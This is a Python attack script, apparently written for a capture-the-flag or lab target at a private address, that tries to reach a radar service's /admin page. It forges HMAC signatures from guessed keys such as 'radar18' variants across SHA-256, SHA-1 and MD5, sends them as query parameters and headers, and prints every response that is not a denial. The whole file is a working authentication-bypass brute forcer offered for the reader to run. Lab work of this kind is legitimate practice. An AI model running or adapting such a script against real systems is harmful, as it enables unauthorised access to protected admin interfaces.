#!/usr/bin/env python3
# Try to reach /admin on Coastal radar by signing it with HMAC(radar18, <something>).
# YOU run this against the target. Prints any response that is NOT the "denied"/"no" page.
# Tries: sig as query param (?sig= / ?token= / ?h=), as header (X-Signature / X-Sig / Authorization),
# over several messages (the path, the resource name, "admin", station id).
import hmac, hashlib, urllib.request, urllib.parse, re

BASE = "http://10.10.10.22:8448"
keys  = ["radar18", "18radar", "radar-18", "radar_18", "radar"]
algos = {"sha256": hashlib.sha256, "sha1": hashlib.sha1, "md5": hashlib.md5}
msgs  = ["/admin", "admin", "admin18", "18", "station18", "radar", "/admin18"]
qparams = ["sig", "token", "h", "hmac", "mac", "signature", "key"]
hparams = ["X-Signature", "X-Sig", "X-Hmac", "Authorization", "X-Token"]

def get(url, headers=None):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=headers or {}), timeout=5)
        return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def tail(body):
    m = re.search(r'RADAR CALIBRATION</p>(.*?)</div>', body, re.S)
    return (m.group(1) if m else body[:160]).strip()

def interesting(code, t):
    return t not in ("denied", "no") and code not in (404,)

seen=set()
for k in keys:
    for an, h in algos.items():
        for m in msgs:
            sig = hmac.new(k.encode(), m.encode(), h).hexdigest()
            # query-param variants
            for qp in qparams:
                url = f"{BASE}/admin?{urllib.parse.urlencode({qp: sig})}"
                code, body = get(url); t = tail(body)
                if interesting(code, t) and t[:60] not in seen:
                    seen.add(t[:60]); print(f"[{code}] GET /admin?{qp}= key={k} {an} msg={m!r} -> {t[:200]!r}")
            # header variants
            for hp in hparams:
                code, body = get(f"{BASE}/admin", {hp: sig}); t = tail(body)
                if interesting(code, t) and t[:60] not in seen:
                    seen.add(t[:60]); print(f"[{code}] GET /admin [{hp}] key={k} {an} msg={m!r} -> {t[:200]!r}")
print("done. (only non-denied/non-404 shown)")
